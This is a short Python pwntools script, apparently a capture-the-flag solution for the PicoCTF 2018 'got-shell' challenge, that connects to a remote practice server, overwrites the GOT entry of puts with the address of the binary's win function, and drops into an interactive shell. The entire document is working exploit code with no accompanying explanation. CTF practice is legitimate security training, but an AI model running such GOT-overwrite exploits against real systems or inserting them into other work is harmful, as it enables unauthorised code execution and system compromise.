from pwn import *
context.log_level = 'debug'
# io = process('./PicoCTF_2018_got-shell')
io = remote('node4.buuoj.cn', 27364)
elf = ELF('./PicoCTF_2018_got-shell')
target = elf.got['puts']
value = elf.symbols['win']

io.sendlineafter(b'value?\n', hex(target)[2:].encode())
io.sendlineafter(hex(target)[2:].encode(), hex(value)[2:].encode())

io.interactive()
